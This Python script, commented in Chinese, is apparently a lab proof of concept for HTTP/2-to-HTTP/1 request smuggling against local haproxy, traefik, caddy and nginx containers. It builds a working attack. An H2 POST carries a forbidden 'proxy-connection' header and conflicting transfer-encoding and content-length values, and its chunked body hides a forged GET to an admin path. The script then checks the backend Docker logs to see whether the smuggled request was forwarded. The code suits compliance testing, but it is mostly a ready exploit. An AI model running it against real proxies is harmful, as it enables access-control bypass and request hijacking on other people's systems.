#!/usr/bin/env python3
"""
`proxy-connection` + TE/CL 组合（H2→H1）PoC
对齐 b_results/HEADERS_proxy_connection_response.txt

发送 HTTP/2 POST：
  - 禁止头 `proxy-connection: keep-alive, transfer-encoding`
  - `transfer-encoding: chunked` 与 `content-length: 50`（与 H1 走私叙事一致；H2 层可能直接拒绝）
  - DATA：分帧或单帧承载 chunked 编码体（首块 0x32=50 字节，次块 0x80=128 字节含伪造 GET，末块 0）

验证：H2 响应帧；backend 是否出现 `Proxy-Connection:` / 路径 `/poc-h2-proxy-connection` / `/poc-proxy-conn-admin`。
"""

from __future__ import annotations

import argparse
import socket
import ssl
import subprocess
import sys
from typing import Any

from hpack import Encoder
from hyperframe.frame import (
    DataFrame,
    Frame,
    GoAwayFrame,
    HeadersFrame,
    PingFrame,
    RstStreamFrame,
    SettingsFrame,
    WindowUpdateFrame,
)

CONNECTION_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

POST_PATH = "/poc-h2-proxy-connection"
ADMIN_MARKER = "/poc-proxy-conn-admin"

H2_ERRORS: dict[int, str] = {
    0x1: "PROTOCOL_ERROR",
    0x2: "INTERNAL_ERROR",
    0x5: "STREAM_CLOSED",
    0x9: "COMPRESSION_ERROR",
}


def read_exact(sock: ssl.SSLSocket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("peer closed while reading frame")
        buf += chunk
    return buf


def read_one_frame(sock: ssl.SSLSocket) -> Frame:
    header = read_exact(sock, 9)
    frame, body_len = Frame.parse_frame_header(memoryview(header))
    payload = read_exact(sock, body_len) if body_len else b""
    frame.parse_body(memoryview(payload))
    return frame


def h2_handshake(sock: ssl.SSLSocket, idle_timeout: float = 2.0) -> None:
    sock.settimeout(idle_timeout)
    while True:
        try:
            fr = read_one_frame(sock)
        except socket.timeout:
            return
        if isinstance(fr, SettingsFrame) and "ACK" not in fr.flags:
            ack = SettingsFrame(stream_id=0)
            ack.flags.add("ACK")
            sock.sendall(ack.serialize())
            continue
        if isinstance(fr, SettingsFrame) and "ACK" in fr.flags:
            continue
        if isinstance(fr, PingFrame) and "ACK" not in fr.flags:
            pk = PingFrame(stream_id=0, opaque_data=bytes(fr.opaque_data)[:8])
            pk.flags.add("ACK")
            sock.sendall(pk.serialize())
            continue
        if isinstance(fr, WindowUpdateFrame) and fr.stream_id == 0:
            continue
        return


def build_chunked_body() -> bytes:
    """对齐 txt：32h=50 字节首块；80h=128 字节次块（内含伪造 GET，不足则填充）；0 结束块。"""
    benign = b"B" * 50
    chunk1 = b"32\r\n" + benign + b"\r\n"

    smuggle = (
        b"GET "
        + ADMIN_MARKER.encode()
        + b" HTTP/1.1\r\n"
        b"Host: poc-backend\r\n"
        b"X-Poc-Smuggled: 1\r\n"
        b"\r\n"
    )
    chunk2_body_len = 0x80  # 128
    if len(smuggle) > chunk2_body_len:
        smuggle = smuggle[:chunk2_body_len]
    else:
        smuggle = smuggle + b"Z" * (chunk2_body_len - len(smuggle))
    chunk2 = b"80\r\n" + smuggle + b"\r\n"
    return chunk1 + chunk2 + b"0\r\n\r\n"


def run_probe(
    bind_host: str,
    port: int,
    read_timeout: float,
    split_data: bool,
) -> dict[str, Any]:
    authority = f"{bind_host}:{port}"
    body = build_chunked_body()

    enc = Encoder()
    header_block = enc.encode(
        [
            (b":method", b"POST"),
            (b":scheme", b"https"),
            (b":path", POST_PATH.encode()),
            (b":authority", authority.encode()),
            (b"content-length", b"50"),
            (b"proxy-connection", b"keep-alive, transfer-encoding"),
            (b"transfer-encoding", b"chunked"),
            (b"user-agent", b"attack-client/1.0"),
        ]
    )

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    raw = socket.create_connection((bind_host, port), timeout=10)
    tls = ctx.wrap_socket(raw, server_hostname=bind_host)
    tls.sendall(CONNECTION_PREFACE)
    tls.sendall(SettingsFrame(stream_id=0).serialize())
    h2_handshake(tls)

    h = HeadersFrame(stream_id=1, data=header_block, flags=["END_HEADERS"])
    tls.sendall(h.serialize())

    if split_data:
        # 与 txt 一致：首 DATA 仅第一 chunk；次 DATA 余下；末 DATA 空 + END_STREAM
        c1_end = len(b"32\r\n") + 50 + len(b"\r\n")
        tls.sendall(DataFrame(stream_id=1, data=body[:c1_end], flags=[]).serialize())
        tls.sendall(
            DataFrame(stream_id=1, data=body[c1_end:], flags=[]).serialize()
        )
        tls.sendall(DataFrame(stream_id=1, data=b"", flags=["END_STREAM"]).serialize())
    else:
        tls.sendall(
            DataFrame(stream_id=1, data=body, flags=["END_STREAM"]).serialize()
        )

    events: list[str] = []
    tls.settimeout(read_timeout)
    try:
        while True:
            try:
                fr = read_one_frame(tls)
            except socket.timeout:
                events.append(f"read_timeout_{read_timeout}s")
                break
            except ConnectionError as e:
                events.append(f"connection_closed:{e}")
                break
            if isinstance(fr, GoAwayFrame):
                events.append(
                    f"GOAWAY err=0x{fr.error_code:x}({H2_ERRORS.get(fr.error_code, '?')})"
                )
                break
            if isinstance(fr, RstStreamFrame):
                events.append(
                    f"RST_STREAM sid={fr.stream_id} err=0x{fr.error_code:x}"
                )
                continue
            events.append(f"{type(fr).__name__}(sid={fr.stream_id})")
    finally:
        try:
            tls.close()
        except OSError:
            pass

    return {
        "port": port,
        "body_total": len(body),
        "events": events,
        "split_data": split_data,
    }


def fetch_backend_logs() -> str:
    try:
        p = subprocess.run(
            ["docker", "logs", "backend", "--tail", "150"],
            capture_output=True,
            text=True,
            timeout=15,
        )
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return f"(docker logs failed: {e})"


def main() -> int:
    ap = argparse.ArgumentParser(description="H2 proxy-connection + TE/CL probe")
    ap.add_argument("--targets", nargs="*", default=["8443", "9443", "10443", "11443"])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--read-timeout", type=float, default=2.0)
    ap.add_argument(
        "--split-data",
        action="store_true",
        help="split DATA frames like the JSON PoC (default: single DATA + END_STREAM)",
    )
    ap.add_argument("--skip-docker-logs", action="store_true")
    args = ap.parse_args()

    port_names = {8443: "haproxy", 9443: "traefik", 10443: "caddy", 11443: "nginx"}

    print("=== proxy-connection + TE chunked PoC (HEADERS_proxy_connection_response.txt) ===\n")
    print(f"POST {POST_PATH}")
    print("  proxy-connection: keep-alive, transfer-encoding")
    print("  transfer-encoding: chunked, content-length: 50")
    print(f"  chunked body ends with smuggle marker {ADMIN_MARKER}\n")

    for port_s in args.targets:
        if ":" in port_s:
            port_str, label = port_s.split(":", 1)
            port = int(port_str)
        else:
            port = int(port_s)
            label = port_names.get(port, str(port))
        r = run_probe(args.host, port, args.read_timeout, args.split_data)
        print(f"[{label} :{port}] h2_body_bytes={r['body_total']} split_data={r['split_data']}")
        for ev in r["events"]:
            print(f"  {ev}")
        print()

    if not args.skip_docker_logs:
        print("=== backend tail (Proxy-Connection / poc paths) ===\n")
        sys.stdout.write(fetch_backend_logs())

    print(
        "\n判读: 合规 H2 端应对含 `proxy-connection` 的请求 RST/PROTOCOL_ERROR 且不转发。"
        "若 backend 出现 `Proxy-Connection:` 或完整 chunked+走私字节，说明存在不当转发，需结合栈版本分析。"
    )
    return 0


if __name__ == "__main__":
    sys.exit(main())
